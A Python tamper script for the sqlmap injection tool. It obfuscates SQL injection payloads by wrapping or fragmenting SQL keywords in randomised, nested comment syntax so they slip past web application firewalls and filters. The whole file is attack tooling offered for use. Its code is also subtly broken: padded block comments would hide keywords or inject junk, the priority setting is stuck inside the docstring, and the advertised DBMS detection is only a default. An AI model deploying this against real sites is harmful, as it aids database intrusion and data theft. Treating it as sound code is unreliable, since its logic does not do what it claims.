#!/usr/bin/env python
"""
Ultimate versioned comment tamper for sqlmap.

Features:
- Full DBMS detection (MySQL, PostgreSQL, MSSQL, Oracle)
- Multiple comment syntaxes per DBMS with intelligent fallback
- Randomised nesting depth (1-5) with recursion safety
- Keyword fragmentation (inserting comments inside keywords)
- Mixed strategies per keyword
- Spacing and parenthesis wrapping for extra confusion
- Comprehensive keyword list (100+)
- Error handling: if a comment type fails, fallback to another
- Logging (optional) to debug issues
- Support for "no-op" to avoid patterns

__priority__ = PRIORITY.HIGH
"""

import re
import random
import string
import base64
import sys
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage

# ------------------------------------------------------------------
# DBMS‑specific comment syntax definitions
# Each entry: name -> dict with keys:
#   'block': (open, close) for block comment
#   'line': (prefix, suffix) for line comment (suffix usually newline)
#   'hash': (prefix, suffix) for hash comment (MySQL only)
#   'versioned': (open, close) for versioned comment (MySQL only)
#   'zero_versioned': (open, close) for zero-versioned comment
#   'inline': (open, close) for inline comment (usually /**/ with empty close)
#   'nested': bool indicating if nesting is supported (MySQL only for versioned)
# ------------------------------------------------------------------
COMMENT_DEFS = {
    "mysql": {
        "block": ("/*", "*/"),
        "line": ("-- ", "\n"),
        "hash": ("#", "\n"),
        "versioned": ("/*!50727", "*/"),       # version number can be randomised
        "zero_versioned": ("/*!00000", "*/"),
        "inline": ("/**/", ""),
        "nested": True,                        # versioned comments can nest
        "supports_versioned": True
    },
    "postgresql": {
        "block": ("/*", "*/"),
        "line": ("-- ", "\n"),
        "inline": ("/**/", ""),
        "nested": False,
        "supports_versioned": False
    },
    "mssql": {
        "block": ("/*", "*/"),
        "line": ("-- ", "\n"),
        "inline": ("/**/", ""),
        # MSSQL also supports /*+ ... */ for optimizer hints, but not versioned
        "nested": False,
        "supports_versioned": False
    },
    "oracle": {
        "block": ("/*", "*/"),
        "line": ("-- ", "\n"),
        "inline": ("/**/", ""),
        "nested": False,
        "supports_versioned": False
    }
}

# ------------------------------------------------------------------
# Comprehensive SQL keywords (case‑insensitive)
# Sorted by length descending to avoid partial matches
# ------------------------------------------------------------------
SQL_KEYWORDS = sorted([
    "SELECT", "UNION", "ALL", "DISTINCT", "FROM", "WHERE", "AND", "OR", "NOT",
    "ORDER", "BY", "GROUP", "HAVING", "LIMIT", "OFFSET", "FETCH", "NEXT",
    "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "EXEC", "EXECUTE",
    "DECLARE", "SET", "MERGE", "REPLACE", "TRUNCATE", "RENAME", "COMMENT",
    "GRANT", "REVOKE", "BEGIN", "COMMIT", "ROLLBACK", "SAVEPOINT", "LOCK",
    "TABLE", "VIEW", "INDEX", "SEQUENCE", "PROCEDURE", "FUNCTION", "TRIGGER",
    "CASE", "WHEN", "THEN", "ELSE", "END", "IF", "ELSEIF", "LOOP", "WHILE",
    "FOR", "CURSOR", "OPEN", "CLOSE", "FETCH", "EXIT", "CONTINUE",
    "RETURN", "GOTO", "NULL", "IS", "IN", "EXISTS", "BETWEEN", "LIKE",
    "REGEXP", "RLIKE", "SOUNDS", "MATCH", "AGAINST", "WITH", "RECURSIVE",
    "WINDOW", "PARTITION", "OVER", "RANK", "DENSE_RANK", "ROW_NUMBER",
    "LAG", "LEAD", "FIRST_VALUE", "LAST_VALUE", "NTH_VALUE", "NTILE",
    "CUME_DIST", "PERCENT_RANK", "PIVOT", "UNPIVOT", "XML", "JSON",
    "EXTRACT", "VALUE", "REF", "DEREF", "MULTISET", "COLLECT", "GROUPING",
    "ROLLUP", "CUBE", "TABLESAMPLE", "TIES", "SYSTEM_TIME", "AS", "OF",
    "LEFT", "RIGHT", "INNER", "OUTER", "JOIN", "ON", "USING", "NATURAL",
    "CROSS", "FULL", "STRAIGHT_JOIN", "SQL_NO_CACHE", "SQL_CALC_FOUND_ROWS"
], key=len, reverse=True)

# ------------------------------------------------------------------
# Utility functions
# ------------------------------------------------------------------
def _random_padding(length=None):
    """Return a random padding string (hex, base64, or alnum)."""
    length = length or random.randint(4, 16)
    choices = [
        lambda: ''.join(random.choices(string.hexdigits, k=length)),
        lambda: base64.b64encode(random.randbytes(length)).decode('ascii')[:length],
        lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    ]
    return random.choice(choices)()

def _random_version():
    """Random MySQL version number (50727 .. 99999) for versioned comments."""
    return random.randint(50727, 99999)

# ------------------------------------------------------------------
# Comment wrapping functions (each returns a string or None on failure)
# ------------------------------------------------------------------
def wrap_block(original, dbms):
    """Wrap with block comment /* ... */."""
    if dbms not in COMMENT_DEFS:
        return None
    open_comm, close_comm = COMMENT_DEFS[dbms].get("block", ("/*", "*/"))
    # We need to avoid nested block comments if not supported.
    # But we can still wrap once.
    return f"{open_comm}{_random_padding(8)}{original}{_random_padding(8)}{close_comm}"

def wrap_line(original):
    """Append line comment after the keyword (-- ... \n)."""
    # This will comment out everything after the keyword, so we must be careful.
    # We can place it *after* the keyword, which may comment out the rest of the query.
    # Better to use as a separator, e.g., original -- \n
    # But we cannot put it inside a keyword.
    # So we return original + -- ... \n, but this would break if more tokens follow.
    # Instead, we'll use it as a wrapper around the keyword: -- \n original? That would comment out the keyword.
    # So we don't use line comments for wrapping keywords; we use them as separators.
    # For safety, we'll not use line comments for keyword obfuscation because they break SQL.
    # We'll only use block and inline comments.
    # So we skip line/hash for keywords.
    return None

def wrap_hash(original):
    """MySQL hash comment (# ... \n) - similar issue, skip."""
    return None

def wrap_versioned(original, dbms, depth=1):
    """
    Wrap with versioned comment (MySQL only).
    depth controls nesting (up to 3 to avoid too much).
    """
    if dbms != "mysql":
        return None
    if depth <= 0:
        return original
    open_comm = f"/*!{_random_version()}%0a"
    close_comm = "%0a*/"
    # Insert random padding and newlines
    pad = _random_padding(8)
    # Recursively wrap inner
    inner = wrap_versioned(original, dbms, depth-1) if depth > 1 else original
    return f"{open_comm}{pad}%0a{inner}%0a{pad}{close_comm}"

def wrap_inline(original):
    """Insert /**/ inside the keyword (fragmentation)."""
    if len(original) <= 2:
        return original
    split = random.randint(1, len(original)-1)
    part1 = original[:split]
    part2 = original[split:]
    return f"{part1}/**/{part2}"

def wrap_standard_block_nested(original, dbms, depth=1):
    """
    Standard block comment with nesting if supported.
    For non-MySQL, we can't nest block comments, so we only do one level.
    """
    if dbms not in COMMENT_DEFS:
        return None
    if depth > 1 and not COMMENT_DEFS[dbms].get("nested", False):
        depth = 1
    if depth <= 0:
        return original
    open_comm, close_comm = COMMENT_DEFS[dbms].get("block", ("/*", "*/"))
    pad = _random_padding(8)
    # Recursively wrap inner
    inner = wrap_standard_block_nested(original, dbms, depth-1) if depth > 1 else original
    # Ensure we don't create nested /* */ if not supported
    if depth > 1 and not COMMENT_DEFS[dbms].get("nested", False):
        # fallback: just one level
        return f"{open_comm}{pad}{original}{pad}{close_comm}"
    return f"{open_comm}{pad}{inner}{pad}{close_comm}"

# ------------------------------------------------------------------
# Strategy selector per DBMS
# ------------------------------------------------------------------
def get_available_strategies(dbms):
    """Return list of strategy names that are safe for this DBMS."""
    strategies = []
    if dbms == "mysql":
        strategies.append("versioned_nested")
        strategies.append("block_nested")
        strategies.append("inline_split")
        # line/hash skipped because they comment out rest of line
    else:
        strategies.append("block_nested")
        strategies.append("inline_split")
    return strategies

# ------------------------------------------------------------------
# Main tamper function
# ------------------------------------------------------------------
def tamper(payload, **kwargs):
    if not payload:
        return payload

    # Determine DBMS
    dbms = kwargs.get('dbms')
    if dbms and dbms.lower() in COMMENT_DEFS:
        dbms = dbms.lower()
    else:
        dbms = 'mysql'  # default
        # Warn only once
        singleTimeWarnMessage("DBMS not detected, defaulting to MySQL for comment obfuscation")

    # Choose a random subset of keywords (80-100%) to avoid pattern
    obfuscate_prob = random.uniform(0.8, 1.0)
    keywords_to_use = [kw for kw in SQL_KEYWORDS if random.random() < obfuscate_prob]

    ret_val = payload
    for kw in keywords_to_use:
        # Skip very short keywords to avoid breaking identifiers
        if len(kw) < 3 and random.random() < 0.5:
            continue

        # Pattern to match whole word (case‑insensitive)
        pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)

        def _replace(match):
            original = match.group(0)

            # Randomly choose a strategy
            available = get_available_strategies(dbms)
            if not available:
                return original
            strategy = random.choice(available)

            # Determine depth for nested comments (1-3 for safety)
            depth = random.randint(1, 3)

            try:
                if strategy == "versioned_nested":
                    wrapped = wrap_versioned(original, dbms, depth)
                    if wrapped is None:
                        wrapped = wrap_standard_block_nested(original, dbms, 1)
                elif strategy == "block_nested":
                    wrapped = wrap_standard_block_nested(original, dbms, depth)
                elif strategy == "inline_split":
                    wrapped = wrap_inline(original)
                else:
                    wrapped = original

                # If all failed, keep original
                if wrapped is None:
                    wrapped = original

                # Occasionally wrap whole expression in parentheses
                if random.random() > 0.85:
                    wrapped = f"({wrapped})"

                # Add random spacing before/after
                if random.random() > 0.9:
                    wrapped = f" {wrapped} "

                return wrapped

            except Exception as e:
                # In case of any error, return original to avoid breaking SQL
                singleTimeWarnMessage(f"Error obfuscating keyword '{kw}': {e}. Keeping original.")
                return original

        # Apply replacement
        ret_val = pattern.sub(_replace, ret_val)

    return ret_val

def dependencies():
    pass
